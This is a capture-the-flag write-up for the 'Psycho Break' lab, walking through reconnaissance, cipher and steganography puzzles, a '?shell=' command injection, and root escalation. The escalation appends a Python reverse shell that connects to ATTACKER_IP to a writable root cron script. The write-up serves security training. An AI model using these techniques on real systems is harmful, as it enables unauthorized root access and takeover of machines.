
# Psycho Break

"This room is based on a video game called evil within". I see a load of steganograpy and 
cryptography coming our way...

---

## *Recon*

We'll start with our usual nmap scan

> `sudo nmap 10.10.242.66 -Pn -p- -A -vv -T4 -oN nmap-scan --script discovery,vuln --min-parallelism 60`    

Select running services with this command:

> `cat nmap-scan | grep -e '[0-9]\+/tcp[[:space:]].*' -o`

[x] 21/tcp open  ftp     syn-ack ttl 63 ProFTPD 1.3.5a

[x] 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)

[x] 80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))

- How many ports are open?

> 3

- What is the operating system that runs on the target machine?

> Ubuntu

---

## *Web*

Let's analyze nmap output. In 'http' section we find a comment:

> < !-- Sebastian sees a path through the darkness which leads to a room => /sadistRoom -->

#### *Locker room*

http-enum gave us rather disappointing results. Let's navigate to /sadistRoom.
Right there we see a link, clicking on that: and key to the locker room pops up.

#### *Map room*

After entering the key, we find ourselves in the locker room with a note that
contains encrypted message:

> Tizmg_nv_zxxvhh_gl_gsv_nzk_kovzhv

After trying a ton of ciphers, it turned out that the message is encrypted using
Beaufort cipher:

***Features***

- The Beaufort cipher is a polyalphabetic substitution cipher. The Enigma machine is 
another example of a (more complex) polyalphabetic substitution cipher.
- The Beaufort cipher is reciprocal, that is, decryption and encryption algorithms are 
the same.
- A Beaufort cipher works similar to the Vigenere cipher, only that instead of adding 
letter values, it calculates the cipherletter = keyletter: plaintextletter.
- After applying an Atbash cipher, the Beaufort cipher can be broken using same methods 
as a Vigenere cipher.

Beaufort ciphers, and variants of it, are occasionally used in CTFs, geocaching mystery 
caches, and logic puzzles. 

You can crack it using [Boxentriq](https://www.boxentriq.com/code-breaking/beaufort-cipher)

After entering the key, we are presented with a sitemap:

- /sadistRoom/
- /lockerRoom/
- /SafeHeaven/
- /abandonedRoom/

#### *SafeHeaven Room*

We are presented with a comment:

> < !-- I think I'm having a terrible nightmare. Search through me and find it ... --\>

Fire up ffuf and search for directories:

> `./ffuf -u http://10.10.155.224:80/SafeHeaven/FUZZ -ic -of html -o ~/CTF/PsychoBreak/ffuf-safe-heaven-report.html -w ~/CyberSecurity/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 55`

Results I got:

- imgs   [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 54ms]
- keeper [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 52ms]

Let's visit 'keeper' directory. We are presented with an 'Escape keeper' button.
After clicking on it, we have 90 seconds to find out the location of this object:

![Lighthouse](https://i.postimg.cc/bw9mxgnM/image.jpg)

> St. Augustine Lighthouse

Congrats! We have a keeper's key

#### *Abandoned Room*

We end up on a page with a spidder lady. There's a comment on this page:

> < !-- There is something called "shell" on current page maybe that'll help you to get out of here !!!-->

I assumed that somehow we are allowed to execute shell commands using this page.
Let's append

> ?shell=ls

to current url and we have some results!

To find the filename, traverse the directory.

---

## *Help Mee*

There's a zip archive on the page with note that says 'Good job in escaping from 
Laura'. Let's download it and browse through content

- helpme.txt

> From Joseph,
>
> Who ever sees this message "HELP Me". Ruvik locked me up in this cell. Get the key on >
> 
> the table and unlock this cell. I'll tell you what happened when I am out of 
>
> this cell.

- Table.jpg

... And the table is actually a bitt more then it tries to seem like:

![Table-exif](https://i.postimg.cc/MGbXKch1/Table-exiftool-screen.png)

The archive has 2 more entries: 

- key.wav
- Joseph_Oda.jpg

The audio contains a message in morse-code. You can use [Morsecode.world](https://morsecode.world/international/decoder/audio-decoder-adaptive.html)
to translate audio to text. Playing the message a couple of times reveals the message.

For analysing emage we'll use steghide:

> `steghide --extract -sf Joseph_Oda.jpg`

Enter the morse-code message and you'll be presented with a thankyou.txt, which contains
FTP credentials.

---

## *Crack it open*

Via FTP we can download 2 files:

- program (ELF)
- random.dic (ASCII text)

I wasn't able to to find which password does this program use with static analysis, so
let's try bruteforcing:

> `strings random.dic > random.txt`
> 
> `chmod +x program`
> 
> `while read line; do ./program "$line"; done < random.txt`

And we now have a message to decode:

> 55 444 3 6 2 66 7777 7 2 7777 7777 9 666 777 3 444 7777 7777 666 7777 8 777 2 66 4 33

I just pasted this into the search bar of my browser)))0))0))0)0))

The search engine showed a couple of similar challenges, where you were supposed to
decrypt similar messages, using an old mobile phone keyboard layout:

|  |  |  |
| --- | --- | --- |
| 1 ~ | 2 abc  | 3 def |
| 4 ghi | 5 jkl | 6 mno |
| 7 pqrs | 8 tuv | 9 wxyz |

> ...s password is ...

---

## *Go capture the flag*

Login to ssh using these credentials. ***NOTE***: Password is all uppercase.

#### *user.txt*

user.txt is right there, just `cat` it

#### *root.txt*

We'll start with a simple enumeration:

> `cat /etc/crontab`

- */2 * * * * root python3 /var/.the_eye_of_ruvik.py

Let's take a look at the file

> `cd /var/`
>
> `ls -la | grep eye`

- -rwxr-xrw-  1 root root    300 Aug 14  2020 .the_eye_of_ruvik.py

Ok, let's append python reverse shell there and wait for 2 minutes.

```
import socket,os,pty;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("ATTACKER_IP",8000));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
pty.spawn("/bin/sh");
```

That's it! Frankly, privilege escalation was the easiest part of this room.

#### *Defeat ruvik (Optional)*

Just delete his account. In you root terminal:

> `userdel ruvik`
